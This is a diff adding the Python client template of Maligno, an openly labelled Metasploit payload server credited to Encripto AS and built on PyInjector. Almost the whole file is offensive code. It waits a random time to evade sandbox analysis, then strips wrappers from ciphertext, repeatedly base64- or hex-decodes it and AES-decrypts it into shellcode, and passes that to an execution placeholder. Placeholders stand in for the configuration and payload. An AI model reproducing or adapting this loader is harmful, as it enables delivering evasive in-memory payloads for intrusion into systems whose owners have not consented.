@@ -1,0 +1,90 @@
+################################################################
+#                                                              #
+# Maligno - A Metasploit payload server                        #
+# The client template is a modified version of PyInjector      #
+# written by Juan J. Guelfo @ Encripto AS                      #
+# post@encripto.no                                             #
+#                                                              #
+# Copyright 2013-2015 Encripto AS. All rights reserved.        #
+#                                                              #
+# Maligno is licensed under the FreeBSD license.               #
+# http://www.freebsd.org/copyright/freebsd-license.html        #
+#                                                              #
+################################################################
+#                                                              #
+# Original work and credit:                                    #
+#                                                              #
+# PyInjector Written by Dave Kennedy (ReL1K) @ TrustedSec.com  #
+# Injects shellcode into memory through Python and ctypes      #
+#                                                              #
+# Initial awesome code and credit found here:                  #
+# http://www.debasish.in/2012_04_01_archive.html               #
+#                                                              #
+################################################################
+
+import ctypes, base64, sys
+from Crypto.Cipher import AES
+from time import sleep
+from random import randint
+
+__version__ = "2.1"
+
+<CONFIG>
+cfg_cipher = AES.new(cfg_secret)
+cfg_total = 0
+cfg_has_slept = False
+cfg_nap_time = randint(0, cfg_max_nap_time)
+
+
+def unpack_data(ud_ctext, ud_cipher, ud_encoding_method, ud_encoding_rounds, ud_resp_prefix, ud_resp_suffix):
+    try:
+        if len(ud_resp_prefix) > 0:
+            ud_ctext = ud_ctext.replace(ud_resp_prefix, "")
+
+        if len(ud_resp_suffix) > 0:
+            ud_ctext = ud_ctext.replace(ud_resp_suffix, "")
+
+        if ud_encoding_method.upper() in ["BASE64"]:
+            for ud_i in range(0, ud_encoding_rounds):
+                ud_ctext = base64.b64decode(ud_ctext)
+
+        elif ud_encoding_method.upper() in ["HEX"]:
+            for ud_i in range(0, ud_encoding_rounds):
+                ud_ctext = ud_ctext.decode("hex")
+
+        elif ud_encoding_method.upper() in ["BIN"]:
+            ud_ctext = ud_ctext
+
+        else:
+            for ud_i in range(0, ud_encoding_rounds):
+                ud_ctext = base64.b64decode(ud_ctext)
+
+        ud_plaintext = ud_cipher.decrypt(ud_ctext).split(":")
+        ud_padding_char = ud_plaintext[2]
+        ud_shellcode = ud_plaintext[0].rstrip(ud_padding_char)
+
+    except:
+        sys.exit(0)
+
+    return ud_shellcode
+
+
+if __name__ == '__main__':
+
+    if cfg_nap_time <= 0:
+        cfg_nap_time = 1
+
+    for m_iteration in xrange(0, cfg_nap_time):
+        sleep(1)
+        cfg_total += m_iteration
+        if cfg_total == sum(xrange(0, cfg_nap_time)):
+            cfg_has_slept = True
+
+    if cfg_has_slept:
+        <CTEXT>
+        try:
+            m_shellcode = unpack_data(m_ctext, cfg_cipher, cfg_encoding_method, cfg_encoding_rounds, cfg_resp_prefix, cfg_resp_suffix)
+            if m_shellcode:
+                <EXECUTION>
+        except:
+            sys.exit(0)
